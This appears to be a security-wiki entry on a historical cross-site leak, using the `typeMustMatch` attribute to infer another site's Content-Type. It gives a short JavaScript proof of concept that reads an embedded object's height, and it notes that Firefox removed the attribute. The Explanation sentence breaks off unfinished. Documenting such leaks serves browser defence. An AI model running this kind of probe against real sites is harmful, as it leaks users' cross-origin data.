+++
title = "Content-Type"
description = ""
date = "2020-07-21"
category = "historical"
attacks = [
    "dom property",
]
defenses = [
    "deprecation"
]
menu = "main"
+++

## Explanation

The [`typeMustMatch`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLObjectElement/typeMustMatch) attribute is a boolean that reflects the `typeMustMatch` attribute of an `object` element. It requires a certain MIME type to be enforced when loading an object, checking if the `Content-Type` of the resource




```javascript
let url = 'https://target'
let mime = 'application/json'
let x = document.createElement('iframe');
x.src = `data:text/html,<object id=obj type="${mime}" data="${url}" typemustmatch><script>onload = ()=>{console.log(obj.clientHeight)}%3c/script></object>`;
document.body.appendChild(x);
```

## Fix

Firefox was the only browser supporting the `typeMustMatch` attribute [^2] and since no other browsers offered support, it was removed in version 68 and from the HTML Living Standard.

## References

[^1]: Cross-Site Content and Status Types Leakage, [link](https://medium.com/bugbountywriteup/cross-site-content-and-status-types-leakage-ef2dab0a492)
[^2]: Remove support for typemustmatch, [link](https://bugzilla.mozilla.org/show_bug.cgi?id=1548773)